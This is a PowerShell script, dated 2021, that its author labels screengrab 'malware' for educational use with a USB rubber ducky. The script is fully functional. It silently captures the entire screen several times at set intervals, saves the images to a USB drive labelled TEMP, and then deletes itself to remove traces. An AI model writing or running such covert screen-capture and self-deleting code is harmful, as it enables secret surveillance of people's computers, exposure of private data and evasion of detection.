#POWERSHELL SCREENGRAB "MALWARE"
#takes a screenshot every so many seconds and saves it
#by Cayden Wright
#15 November 2021
#for educational purposes only
#TODO: Email screenshots?
#supposed to be used with a rubber ducky
#WARNING: THIS SCRIPT DELETES ITSELF. MAKE A COPY OR REMOVE LINE 79 IF YOU WANT TO TINKER WITH IT

#USER VARIABLES HERE
$time_between_screenshots = 3 #amount of time to wait between screenshots (in seconds)
$number_of_screenshots = 6 #number of screenshots to take in total

#Screenshot code (stolen from stackoverflow)
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
function screenshot($path) 
{
    $width = 0;
    $height = 0;
    $workingAreaX = 0;
    $workingAreaY = 0;

    $screen = [System.Windows.Forms.Screen]::AllScreens;

    foreach ($item in $screen)
    {
        if($workingAreaX -gt $item.WorkingArea.X)
        {
            $workingAreaX = $item.WorkingArea.X;
        }

        if($workingAreaY -gt $item.WorkingArea.Y)
        {
            $workingAreaY = $item.WorkingArea.Y;
        }

        $width = $width + $item.Bounds.Width;

        if($item.Bounds.Height -gt $height)
        {
            $height = $item.Bounds.Height;
        }
    }

    $bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height); 
    $bmp = New-Object Drawing.Bitmap $width, $height;
    $graphics = [Drawing.Graphics]::FromImage($bmp);

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);

    $bmp.Save($path);

    $graphics.Dispose();
    $bmp.Dispose();
}

#find drive letter of USB named "TEMP"
$driveLetter = (Get-Volume -FileSystemLabel TEMP).DriveLetter
$folder_name = Get-Date -Format "MM_dd_yyyy HH_mm"
#here's where we declare that $save_path_root, after we've determined the current timestamp for the folder along with the drive letter
$save_path_root = "${driveletter}:\"+$folder_name+"\"

New-Item -Path $save_path_root -ItemType "directory"


$i=0
while($i -lt $number_of_screenshots)
{
    #saves screenshot with timestamp down to the second
    $filename=Get-Date -Format "HH_mm_ss"
    $final_name=$save_path_root+$filename+".png"
    screenshot($final_name)
    Start-Sleep -s $time_between_screenshots
    $i++
}
#THIS IS THE SELF DESTRUCT LINE
Remove-Item -Path $MyInvocation.MyCommand.Source